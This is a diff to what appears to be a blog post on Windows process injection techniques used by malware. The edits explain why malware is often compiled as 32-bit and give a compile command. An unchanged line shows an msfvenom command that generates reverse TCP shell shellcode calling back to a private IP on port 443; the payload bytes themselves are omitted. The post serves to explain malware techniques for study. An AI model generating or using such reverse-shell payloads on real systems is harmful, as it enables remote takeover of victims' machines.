@@ -8,9 +8,14 @@ categories: malware
 In this entry, we will dive into Windows process injection techniques demonstrated by malware. Malware authors deploy process injection to run malicious code under another process.
 
 ### 1. Payload & Compiling
-Since most malware are 32-bit. All code below will be compiled in `x86 (32-bit)`, with the command `g++.exe <input.cpp> -o <output.exe> --std=c++20 -static`.
+Many malware authors opt for 32-bit malware, because of it's backwards compatibility with 64-bit systems. 
 
-The issue with writing 32-bit malware, is that it faces difficulties working with the memory of 64-bit processes.
++ 32-bit processes can run on 64-bit systems.
++ 64-bit processes cannot run on 32-bit systems.
+
+Since most malwares are 32-bit. All code below will be compiled in `x86 (32-bit)`, with the command `g++.exe <input.cpp> -o <output.exe> --std=c++20 -static`.
+
+The issue with writing 32-bit malware, is that it faces difficulties working with the memory of 64-bit processes. We will understand this better later.
 
 A simple reverse TCP shell will be used. The shellcode was generated with the following command - `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c`. I will exclude the payload code in below examples due to its obstruction.
 
